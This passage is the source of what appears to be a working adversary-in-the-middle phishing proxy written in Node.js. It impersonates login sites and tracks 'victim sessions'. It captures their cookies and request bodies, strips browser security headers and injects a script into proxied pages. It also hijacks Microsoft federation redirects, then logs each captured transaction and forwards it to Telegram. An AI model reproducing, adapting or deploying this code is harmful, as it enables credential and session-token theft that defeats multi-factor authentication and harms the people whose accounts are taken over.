    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/status', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const last = files.length > 0 ? fs.statSync(path.join(LOGS_DIRECTORY, files[0])).mtime : null;
        res.json({
            online: true,
            totalSessions: files.length,
            lastCapture: last
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ================================================
// 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁
// ================================================

const proxyServer = http.createServer((clientRequest, clientResponse) => {
    const { method, url, headers } = clientRequest;
    const currentSession = getUserSession(headers.cookie);

    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;

            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieName;
            }
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
            VICTIM_SESSIONS[session].port = phishedURL.port;
            VICTIM_SESSIONS[session].host = phishedURL.host;

            clientResponse.writeHead(200, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
        }
        catch (error) {
            displayError("Phishing URL parsing failed", error, url);
            clientResponse.writeHead(404, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
        }
    }

    else if (currentSession || url === PROXY_PATHNAMES.proxy) {
        if (url === PROXY_PATHNAMES.serviceWorker) {
            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
            fs.createReadStream(url.slice(1)).pipe(clientResponse);
        }
        else if (url === PROXY_PATHNAMES.favicon) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
            clientResponse.end();
        }

        else {
            let clientRequestBody = [];
            clientRequest
                .on("error", (error) => {
                    displayError("Client request body retrieval failed", error, method, url);
                })
                .on("data", (chunk) => {
                    clientRequestBody.push(chunk);
                })
                .on("end", () => {
                    clientRequestBody = Buffer.concat(clientRequestBody).toString();

                    if (!currentSession) {
                        if (clientRequestBody) {
                            try {
                                clientRequestBody = JSON.parse(clientRequestBody);
                                const proxyRequestURL = new URL(clientRequestBody.url);
                                const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                if (proxyRequestURL.hostname === headers.host &&
                                    proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                    try {
                                        const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                        const { cookieName, cookieValue } = generateNewSession(phishedURL);
                                        clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);

                                        VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                        VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                                        VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                        VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                        VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                                        clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
                                        clientResponse.end();
                                    }
                                    catch (error) {
                                        displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                    }
                                } else {
                                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
                                    clientResponse.end();
                                }
                            } catch (error) {
                                displayError("Anonymous client request body parsing failed", error, clientRequestBody);
                            }
                        } else {
                            clientResponse.writeHead(301, { Location: REDIRECT_URL });
                            clientResponse.end();
                        }
                    }

                    else {
                        let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                        const proxyRequestOptions = {
                            hostname: VICTIM_SESSIONS[currentSession].hostname,
                            port: VICTIM_SESSIONS[currentSession].port,
                            method: method,
                            path: VICTIM_SESSIONS[currentSession].path,
                            headers: { ...headers },
                            rejectUnauthorized: false
                        };
                        let isNavigationRequest = false;

                        if (clientRequestBody) {
                            if (url === PROXY_PATHNAMES.jsCookie) {
                                updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                                const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                                clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                clientResponse.end(JSON.stringify(validDomains));
                                return;
                            }

                            else if (url === PROXY_PATHNAMES.proxy) {
                                try {
                                    clientRequestBody = JSON.parse(clientRequestBody);
                                    let proxyRequestURL = new URL(clientRequestBody.url);
                                    let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                    if (proxyRequestURL.hostname === headers.host) {
                                        if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                            try {
                                                const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                                VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                                VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                                VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
                                                VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                                                VICTIM_SESSIONS[currentSession].host = phishedURL.host;

                                                clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
                                                clientResponse.end();
                                            }
                                            catch (error) {
                                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                            }
                                            return;
                                        }

                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
                                            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
                                            fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
                                            return;
                                        }

                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                                            try {
                                                const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                                proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
                                                proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
                                            }
                                            catch (error) {
                                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                                return;
                                            }
                                        }

                                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                                            updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody.body], headers.host, currentSession);
                                            const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                                            clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                            clientResponse.end(JSON.stringify(validDomains));
                                            return;
                                        }
                                    }
                                    proxyRequestProtocol = proxyRequestURL.protocol;
                                    proxyRequestOptions.path = proxyRequestPath;
                                    proxyRequestOptions.port = proxyRequestURL.port;
                                    proxyRequestOptions.method = clientRequestBody.method;

                                    proxyRequestOptions.headers = { ...headers, ...clientRequestBody.headers };
                                    if (proxyRequestURL.hostname !== headers.host) {
                                        proxyRequestOptions.hostname = proxyRequestURL.hostname;
                                        proxyRequestOptions.headers.host = proxyRequestURL.host;
                                    }
                                    if (proxyRequestOptions.headers.referer) {
                                        proxyRequestOptions.headers.referer = clientRequestBody.referrer;
                                    }
                                    isNavigationRequest = clientRequestBody.mode === "navigate";
                                }
                                catch (error) {
                                    displayError("Authenticated client request body parsing failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                                }
                            } else {
                                console.warn(`/!\\ There seems to be a problem with the Service Worker (url !== ${PROXY_PATHNAMES.proxy}). Non-proxied URL: ${url} /!\\`);
                            }
                        } else {
                            console.warn(`/!\\ There seems to be a problem with the Service Worker (no clientRequestBody). Non-proxied URL: ${url} /!\\`);
                        }

                        proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                        updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);

                        const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
                        const requestContentLength = Buffer.byteLength(proxyRequestBody);
                        if (requestContentLength) {
                            proxyRequestOptions.headers["content-length"] = requestContentLength.toString();
                        }
                        else {
                            delete proxyRequestOptions.headers["content-type"];
                            delete proxyRequestOptions.headers["content-length"];
                        }

                        if (isNavigationRequest) {
                            VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
                            VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
                            VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
                            VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                            VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                        }

                        makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest);
                    }
                });
        }
    }

    else {
        clientResponse.writeHead(301, { Location: REDIRECT_URL });
        clientResponse.end();
    }
});

// ================================================
// 𝙼𝙰𝙺𝙴 𝙿𝚁𝙾𝚇𝚈 𝚁𝙴𝚀𝚄𝙴𝚂𝚃
// ================================================

const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
    const protocol = proxyRequestProtocol === "https:" ? https : http;
    const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {

        logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
            .catch(error => displayError("Log encryption failed", error));

        if (isNavigationRequest &&
            proxyRequestOptions.headers.host === VICTIM_SESSIONS[currentSession].host &&
            proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {

            const proxyResponseLocation = proxyResponse.headers.location;
            if (proxyResponseLocation) {
                try {
                    const locationURL = new URL(proxyResponseLocation);

                    VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                    VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                    VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
                    VICTIM_SESSIONS[currentSession].port = locationURL.port;
                    VICTIM_SESSIONS[currentSession].host = locationURL.host;

                    proxyResponse.headers.location = proxyResponseLocation.replace(locationURL.host, proxyHostname);
                } catch {
                    VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
                }
            }
        }
        else if (proxyResponse.statusCode > 400) {
            displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
        }

        const proxyResponseCookie = proxyResponse.headers["set-cookie"];
        if (proxyResponseCookie) {
            updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
        }
        proxyResponse.headers["cache-control"] = "no-store";
        proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
        deleteHTTPSecurityResponseHeaders(proxyResponse.headers);

        let serverResponseBody = [];
        proxyResponse
            .on("error", (error) => {
                displayError("Server response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path);
            })
            .on("data", (chunk) => {
                serverResponseBody.push(chunk);
            })
            .on("end", async () => {
                serverResponseBody = Buffer.concat(serverResponseBody);

                if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) &&
                    Buffer.byteLength(serverResponseBody)) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        serverResponseBody = updateHTMLProxyResponse(decompressedResponseBody);
                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                    }
                    catch (error) {
                        displayError("Server response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                    }
                }

                else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        serverResponseBody = updateFederationRedirectUrl(decompressedResponseBody, proxyHostname);
                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                    }
                    catch (error) {
                        displayError("/common/GetCredentialType response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                    }
                }

                clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                clientResponse.end(serverResponseBody);
            });
    });

    if (proxyRequestBody) {
        proxyRequest.write(proxyRequestBody);
    }
    proxyRequest.end();
}

// ================================================
// 𝙷𝙴𝙻𝙿𝙴𝚁 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽𝚂
// ================================================

function displayError(message, error, ...args) {
    console.error("******************************");
    console.error(`${message}: ${error.name ?? error}`);
    console.error(`Message: ${error.message}`);
    console.error(`Stack trace: ${error.stack}`);

    for (let i = 0; i < args.length; i++) {
        console.error(`Parameter ${i + 1}: ${args[i]}`);
    }
    console.error("******************************");
}

function getUserSession(requestCookies) {
    if (!requestCookies) return;

    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [cookieName, ...cookieValue] = cookie.split("=");

        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) &&
            VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
            return cookieName;
        }
    }
    return;
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });

    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);

    VICTIM_SESSIONS[cookieName] = {};
    VICTIM_SESSIONS[cookieName].value = cookieValue;
    VICTIM_SESSIONS[cookieName].cookies = [];
    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);

    return {
        cookieName: cookieName,
        cookieValue: cookieValue
    };
}

async function encryptData(data) {
    const iv = crypto.randomBytes(16);

    return new Promise((resolve, reject) => {
        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
        const encryptedData = [];

        cipher
            .on("error", (error) => {
                reject(error);
            })
            .on("data", (chunk) => {
                encryptedData.push(chunk);
            })
            .on("end", () => {
                resolve({
                    iv: iv.toString("hex"),
                    encryptedData: Buffer.concat(encryptedData).toString("hex")
                });
            });

        cipher.write(data, "utf-8");
        cipher.end();
    });
}

async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
    const httpProxyTransaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
        proxyRequestMethod: proxyRequestOptions.method,
        proxyRequestHeaders: proxyRequestOptions.headers,
        proxyRequestBody: proxyRequestBody,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers
    };
    const logFileStream = LOG_FILE_STREAMS[currentSession];

    const encryptedResult = await encryptData(JSON.stringify(httpProxyTransaction));

    if (!logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`)) {
        await new Promise(resolve => logFileStream.once("drain", resolve));
    }
        sendToTelegram(httpProxyTransaction);
}

function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
    const splitRequestHostname = requestHostname.split(".");
    const splitCookieDomain = cookieDomain.split(".");

    if (splitCookieDomain.length < 2) {
        return false;
    }
    if (cookieHostOnly && splitRequestHostname.length !== splitCookieDomain.length) {
        return false;
    }
    if (splitRequestHostname.length < splitCookieDomain.length) {
        return false;
    }

    for (let i = 1, l = splitCookieDomain.length + 1; i < l; i++) {
        if (splitCookieDomain.at(-i) !== splitRequestHostname.at(-i)) {
            return false;
        }
    }
    return true;
}

function isPathApplicable(requestPath, cookiePath) {
    const splitRequestPath = requestPath.split("/");
    const splitCookiePath = cookiePath.split("/");

    if (cookiePath === "/") {
        return true;
    }
    if (splitRequestPath.length < splitCookiePath.length) {
        return false;
    }

    for (let i = 1, l = splitCookiePath.length; i < l; i++) {
        if (splitCookiePath[i] !== splitRequestPath[i]) {
            return false;
        }
    }
    return true;
}

function isCookieApplicable(requestOptions, cookie) {
    return (
        isDomainApplicable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
        isPathApplicable(requestOptions.path, cookie.path)
    );
}

function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
    const proxyRequestCookies = {};
    const currentTimestamp = Date.now();

    for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
        if (!(currentTimestamp > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
            proxyRequestCookies[cookie.name] = cookie.value;
        }
    }
    return Object.entries(proxyRequestCookies)
        .map(([cookieName, cookieValue]) => `${cookieName}=${cookieValue}`)
        .join("; ");
}

function parseCookieDate(cookieDate) {
    let foundTime = false;
    let foundDay = false;
    let foundMonth = false;
    let foundYear = false;

    let hourValue, minuteValue, secondValue;
    let dayValue, monthValue, yearValue;

    const delimiterRegex = /[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/;
    const dateTokens = cookieDate.split(delimiterRegex).filter(token => token);

    for (const token of dateTokens) {
        if (!foundTime) {
            const timeMatch = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);

            if (timeMatch) {
                foundTime = true;
                hourValue = parseInt(timeMatch[1]);
                minuteValue = parseInt(timeMatch[2]);
                secondValue = parseInt(timeMatch[3]);
                continue;
            }
        }
        if (!foundDay) {
            const dayMatch = /^(\d{1,2})(?:[^\d]|$)/.exec(token);

            if (dayMatch) {
                foundDay = true;
                dayValue = parseInt(dayMatch[1]);
                continue;
            }
        }
        if (!foundMonth) {
            const monthLowerCase = token.toLowerCase();
            const months = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"];

            for (let i = 0; i < months.length; i++) {
                if (monthLowerCase.startsWith(months[i])) {
                    foundMonth = true;
                    monthValue = i;
                    break;
                }
            }
            if (foundMonth) continue;
        }
        if (!foundYear) {
            const yearMatch = /^(\d{2,4})(?:[^\d]|$)/.exec(token);

            if (yearMatch) {
                foundYear = true;
                yearValue = parseInt(yearMatch[1]);
                continue;
            }
        }
    }

    if (yearValue >= 70 && yearValue <= 99) {
        yearValue += 1900;
    } else if (yearValue >= 0 && yearValue <= 69) {
        yearValue += 2000;
    }

    if (!foundDay || !foundMonth || !foundYear || !foundTime) {
        return NaN;
    }
    if (dayValue < 1 || dayValue > 31) {
        return NaN;
    }
    if (yearValue < 1601) {
        return NaN;
    }
    if (hourValue > 23 || minuteValue > 59 || secondValue > 59) {
        return NaN;
    }

    const parsedCookieDate = new Date(Date.UTC(
        yearValue,
        monthValue,
        dayValue,
        hourValue,
        minuteValue,
        secondValue
    ));

    if (parsedCookieDate.getUTCFullYear() !== yearValue ||
        parsedCookieDate.getUTCMonth() !== monthValue ||
        parsedCookieDate.getUTCDate() !== dayValue) {
        return NaN;
    }
    return parsedCookieDate.getTime();
}

function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
    const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
    const currentTimestamp = Date.now();
    let clockSkew = 0;
    if (proxyResponseDate) {
        clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
    }

    for (const newCookie of newCookies) {
        const [cookie, ...attributes] = newCookie.split(";");
        const [cookieName, ...cookieValue] = cookie.split("=");

        let cookieDomain = request.hostname;
        let cookiePath = (pathNameMatch ?? ["/"])[0];
        let cookieExpires = NaN;
        let cookieMaxAge = "";
        let cookieHostOnly = true;
        let isCookieValid = true;
        for (const attribute of attributes) {

            const cookieAttribute = attribute.trim();
            const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
            const cookiePathMatch = cookieAttribute.match(/^path\s*=(.*)$/i);
            const cookieExpiresMatch = cookieAttribute.match(/^expires\s*=(.*)$/i);
            const cookieMaxAgeMatch = cookieAttribute.match(/^max-age\s*=(.*)$/i);

            if (cookieAttribute.toLowerCase() === "domain") {
                cookieDomain = request.hostname;
                cookieHostOnly = true;
                isCookieValid = true;
            }
            else if (cookieAttribute.toLowerCase() === "path") {
                cookiePath = (pathNameMatch ?? ["/"])[0];
            }
            else if (cookieAttribute.toLowerCase() === "expires") {
                cookieExpires = NaN;
            }
            else if (cookieAttribute.toLowerCase() === "max-age") {
                cookieMaxAge = "";
            }

            else if (cookieDomainMatch) {
                cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                cookieHostOnly = true;
                isCookieValid = true;

                if (!cookieDomain) {
                    cookieDomain = request.hostname;
                }
                else if (cookieDomain === proxyHostname) {
                    cookieDomain = request.hostname;
                    cookieHostOnly = false;
                }
                else if (cookieDomain !== request.hostname) {
                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
                    }
                    else if (!isDomainApplicable(request.hostname, cookieDomain, false)) {
                        isCookieValid = false;
                        continue;
                    }
                    cookieHostOnly = false;
                }
            }
            else if (cookiePathMatch) {
                cookiePath = cookiePathMatch[1].trim();

                if (!cookiePath.startsWith("/")) {
                    cookiePath = (pathNameMatch ?? ["/"])[0];
                }
            }
            else if (cookieExpiresMatch) {
                cookieExpires = cookieExpiresMatch[1].trim();

                cookieExpires = parseCookieDate(cookieExpires);
            }
            else if (cookieMaxAgeMatch) {
                cookieMaxAge = cookieMaxAgeMatch[1].trim();

                if (!/^-?\d+$/.test(cookieMaxAge)) {
                    cookieMaxAge = "";
                }
            }
        }
        if (!isCookieValid) {
            continue;
        }

        cookieExpires += clockSkew;
        if (cookieMaxAge) {
            const seconds = parseInt(cookieMaxAge);
            if (!isNaN(seconds)) {
                cookieExpires = currentTimestamp + seconds * 1000;
            }
        }

        let isNewCookie = true;

        for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
            const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];

            if (sessionCookie.name === cookieName &&
                sessionCookie.domain === cookieDomain &&
                sessionCookie.path === cookiePath &&
                sessionCookie.hostOnly === cookieHostOnly) {

                if (currentTimestamp > cookieExpires) {
                    VICTIM_SESSIONS[currentSession].cookies.splice(i, 1);
                    break;
                }
                sessionCookie.value = cookieValue.join("=");
                sessionCookie.expires = cookieExpires;
                isNewCookie = false;
                break;
            }
        }
        if (isNewCookie && !(currentTimestamp > cookieExpires)) {
            VICTIM_SESSIONS[currentSession].cookies.push({
                name: cookieName,
                value: cookieValue.join("="),
                domain: cookieDomain,
                path: cookiePath,
                expires: cookieExpires,
                hostOnly: cookieHostOnly
            });
        }
    }
}

function getValidDomains(domains) {
    const validDomains = [];

    for (const domain of domains) {
        const splitDomain = domain.split(".");
        for (let i = 2; i < splitDomain.length + 1; i++) {

            const validDomain = splitDomain.slice(-i).join(".");
            if (!validDomains.includes(validDomain)) {
                validDomains.push(validDomain);
            }
        }
    }
    return validDomains;
}

function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
    const azureHTTPRequestHeaders = [
        "max-forwards",
        "x-arr-log-id",
        "client-ip",
        "disguised-host",
        "x-site-deployment-id",
        "was-default-hostname",
        "x-forwarded-proto",
        "x-appservice-proto",
        "x-arr-ssl",
        "x-forwarded-tlsversion",
        "x-forwarded-for",
        "x-original-url",
        "x-waws-unencoded-url",
        "x-client-ip",
        "x-client-port"
    ];

    const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
    if (Object.keys(proxyRequestCookies).length) {
        proxyRequestOptions.headers.cookie = proxyRequestCookies;
    }
    else {
        delete proxyRequestOptions.headers.cookie;
    }

    if (proxyRequestOptions.headers.origin) {
        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
    }
    if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
        (!proxyRequestOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
        delete proxyRequestOptions.headers.referer;
    }

    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
        if (azureHTTPRequestHeaders.includes(key)) {
            delete proxyRequestOptions.headers[key];
        }
        else {
            proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
        }
    }
}

function deleteHTTPSecurityResponseHeaders(headers) {
    const httpSecurityResponseHeaders = [
        "x-frame-options",
        "x-xss-protection",
        "x-content-type-options",
        "set-cookie",
        "content-security-policy",
        "content-security-policy-report-only",
        "cross-origin-opener-policy",
        "cross-origin-embedder-policy",
        "cross-origin-resource-policy",
        "permissions-policy",
        "service-worker-allowed"
    ];

    for (const header of httpSecurityResponseHeaders) {
        delete headers[header];
    }
}

function decompressData(compressedData, encoding) {
    const decompressionAlgorithms = {
        gzip: zlib.gunzip,
        "x-gzip": zlib.gunzip,
        deflate: zlib.inflate,
        br: zlib.brotliDecompress,
        zstd: zlib.zstdDecompress
    };

    return new Promise((resolve, reject) => {
        const decompressionAlgorithm = decompressionAlgorithms[encoding];

        if (decompressionAlgorithm) {
            decompressionAlgorithm(compressedData, (error, decompressedData) => {
                if (error) reject(error);
                else resolve(decompressedData);
            });
        }
        else {
            resolve(compressedData);
        }
    });
}

function compressData(decompressedData, encoding) {
    const compressionAlgorithms = {
        gzip: zlib.gzip,
        "x-gzip": zlib.gzip,
        deflate: zlib.deflate,
        br: zlib.brotliCompress,
        zstd: zlib.zstdCompress
    };

    return new Promise((resolve, reject) => {
        const compressionAlgorithm = compressionAlgorithms[encoding];

        if (compressionAlgorithm) {
            compressionAlgorithm(decompressedData, (error, compressedData) => {
                if (error) reject(error);
                else resolve(compressedData);
            });
        }
        else {
            resolve(decompressedData);
        }
    });
}

async function decompressResponseBody(compressedData, contentEncoding) {
    if (!contentEncoding) {
        return {
            decompressedResponseBody: compressedData,
            encodings: []
        };
    }

    const encodings = contentEncoding.split(",")
        .map(encoding => encoding.trim().toLowerCase())
        .filter(encoding => encoding);

    let decompressedData = compressedData;
    for (let i = encodings.length - 1; i >= 0; i--) {
        decompressedData = await decompressData(decompressedData, encodings[i]);
    }
    return {
        decompressedResponseBody: decompressedData,
        encodings: encodings
    };
}

async function compressResponseBody(decompressedData, encodings) {
    let compressedData = decompressedData;

    for (const encoding of encodings) {
        compressedData = await compressData(compressedData, encoding);
    }
    return compressedData;
}

function updateHTMLProxyResponse(decompressedResponseBody) {
    const payload = "<script src=/@></script>";
    const htmlInjectionMap = {
        "<head>": `<head>${payload}`,
        "<html>": `<html><head>${payload}</head>`,
        "<body>": `<head>${payload}</head><body>`
    };
    const indexLimit = 200;

    for (const [key, value] of Object.entries(htmlInjectionMap)) {
        const htmlTagBuffer = Buffer.from(key);
        const injectionPointIndex = decompressedResponseBody.subarray(0, indexLimit).indexOf(htmlTagBuffer);

        if (injectionPointIndex !== -1) {
            return Buffer.concat([
                decompressedResponseBody.subarray(0, injectionPointIndex),
                Buffer.from(value),
                decompressedResponseBody.subarray(injectionPointIndex + htmlTagBuffer.byteLength)
            ]);
        }
    }
    return Buffer.concat([
        Buffer.from(`<head>${payload}</head>`),
        decompressedResponseBody
    ]);
}

function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
    const decompressedResponseBodyString = decompressedResponseBody.toString();
    const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
    const federationRedirectUrl = decompressedResponseBodyObject.Credentials.FederationRedirectUrl;

    const proxyRequestURL = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
    proxyRequestURL.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(federationRedirectUrl));
    
    decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
    return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
}

// ================================================
